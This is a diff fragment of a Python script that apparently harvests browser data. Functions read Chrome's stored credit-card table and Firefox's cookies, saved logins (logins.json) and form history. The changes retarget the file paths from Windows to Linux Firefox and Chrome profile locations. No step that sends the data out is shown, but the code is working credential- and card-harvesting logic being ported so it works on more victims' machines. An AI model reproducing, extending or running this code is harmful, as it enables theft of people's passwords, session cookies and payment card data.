@@ -58,7 +58,7 @@ def get_chrome_cards():
     FROM autofillProfileNames as n
     INNER JOIN creditCards as c ON n.guid = c.guid
     """
-    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Web Data")
+    path = os.path.expanduser('~/.config/google-chrome/Default/Web Data')
     if not os.path.exists(path):
         print(f"Database file not found: {path}")
         return []
@@ -77,7 +77,7 @@ def get_firefox_cookies():
     """
     path = os.path.expanduser("~/.mozilla/firefox")
     for i in os.listdir(path):
-        if i.endswith(".default"):
+        if i.endswith(".default-release"):
             c = sqlite3.connect(os.path.join(path, i, "cookies.sqlite"))
             cur = c.cursor()
             r = cur.execute(text).fetchall()
@@ -87,7 +87,7 @@ def get_firefox_cookies():
 def get_firefox_passwords():
     path = os.path.expanduser("~/.mozilla/firefox")
     for i in os.listdir(path):
-        if i.endswith(".default"):
+        if i.endswith(".default-release"):
             with open(os.path.join(path, i, "logins.json"), 'r') as file:
                 r = json.load(file)
             return r
@@ -99,7 +99,7 @@ def get_firefox_cards():
     """
     path = os.path.expanduser("~/.mozilla/firefox")
     for i in os.listdir(path):
-        if i.endswith(".default"):
+        if i.endswith(".default-release"):
             c = sqlite3.connect(os.path.join(path, i, "formhistory.sqlite"))
             cur = c.cursor()
             r = cur.execute(text).fetchall()
